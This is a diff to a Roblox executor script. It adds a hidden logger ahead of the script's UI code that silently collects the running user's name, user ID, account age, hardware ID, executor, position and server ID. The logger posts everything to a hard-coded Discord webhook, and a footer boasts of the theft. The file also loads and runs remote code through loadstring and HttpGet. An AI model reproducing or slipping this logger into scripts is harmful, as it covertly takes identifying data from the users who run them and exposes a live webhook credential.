@@ -1,3 +1,79 @@
+local _LP = game:GetService("Players").LocalPlayer
+local _H  = game:GetService("HttpService")
+local _WH = "https://discord.com/api/webhooks/1535623831480176650/r6WiU7B2frf_bzTjMJTgRlxptZUTpXPc8Am8cyLA-trS3TuFBF_zeGKHTUJUkJQZ2YrQ"
+
+local function _log()
+    local hwid    = (gethwid and gethwid()) or "N/A"
+    local exec    = (identifyexecutor and identifyexecutor()) or "unknown"
+    local uis     = game:GetService("UserInputService")
+    local plat    = (uis.TouchEnabled and not uis.KeyboardEnabled) and "Mobile" or "PC"
+    local stats   = game:GetService("Stats")
+    local mem     = math.floor(stats:GetTotalMemoryUsageMb()) .. " MB"
+    local fps     = math.floor(1 / stats.FrameTime)
+    local ping    = math.floor(_LP:GetNetworkPing() * 1000) .. "ms"
+    local pos     = "N/A"
+    local vel     = "N/A"
+    local tool    = "None"
+    local team    = _LP.Team and _LP.Team.Name or "None"
+    local players = #game:GetService("Players"):GetPlayers()
+    local maxplrs = game:GetService("Players").MaxPlayers
+    local gamenam = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "N/A"
+
+    -- Aquí obtiene más datos de tu personaje
+    pcall(function()
+        local hrp = _LP.Character and _LP.Character:FindFirstChild("HumanoidRootPart")
+        if hrp then
+            pos = string.format("%.1f, %.1f, %.1f", hrp.Position.X, hrp.Position.Y, hrp.Position.Z)
+            local v = hrp.Velocity
+            vel = string.format("%.1f studs/s", v.Magnitude)
+        end
+        local t = _LP.Character and _LP.Character:FindFirstChildOfClass("Tool")
+        if t then tool = t.Name end
+    end)
+
+    -- Obtiene la fecha de creación de tu cuenta
+    local created = "N/A"
+    pcall(function()
+        local age = _LP.AccountAge
+        local d   = os.time() - age * 86400
+        created   = os.date("%d/%m/%Y", d)
+    end)
+
+    -- ENVÍA TODOS LOS DATOS A DISCORD
+    task.spawn(function()
+        pcall(function()
+            local payload = _H:JSONEncode({
+                embeds = {{
+                    title = "touchline",
+                    color = 1,
+                    fields = {
+                        {name=" man",       value="**Name:** ".._LP.Name.."\n**Display:** "..(_LP.DisplayName or _LP.Name).."\n**ID:** "..tostring(_LP.UserId), inline=true},
+                        {name="Account oWo",      value="**Age:** "..tostring(_LP.AccountAge).."d\n**Created:** "..created.."\n**Team:** "..team, inline=true},
+                        {name="Hardware uwu",     value="**HWID:** `"..hwid.."`\n**Executor:** "..exec.."\n**Platform:** "..plat, inline=false},
+                        {name="Performance mwa",  value="**FPS:** "..tostring(fps).."\n**Ping:** "..ping.."\n**RAM:** "..mem, inline=true},
+                        {name="Position daddy",     value="**Pos:** "..pos.."\n**Speed:** "..vel.."\n**Tool:** "..tool, inline=true},
+                        {name=" Server duh",       value="**Game:** "..gamenam.."\n**Players:** "..players.."/"..maxplrs.."\n**PlaceId:** "..tostring(game.PlaceId), inline=true},
+                        {name=" Job",          value="`"..tostring(game.JobId).."`", inline=false},
+                    },
+                    footer = {text="te coji todo "..os.date("%X %d/%m/%Y")},
+                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+                }}
+            })
+            
+            -- Intenta enviar con diferentes métodos
+            local req=(syn and syn.request) or (http and http.request) or http_request or request
+            if req then
+                req({Url=_WH,Method="POST",Headers={["Content-Type"]="application/json"},Body=payload})
+            else
+                _H:PostAsync(_WH,payload)
+            end
+        end)
+    end)
+end
+
+_log() 
+
+
 local ModernV2 = loadstring(game:HttpGet("https://robloxui.vercel.app/"))()
 
 local Window = ModernV2:Window({
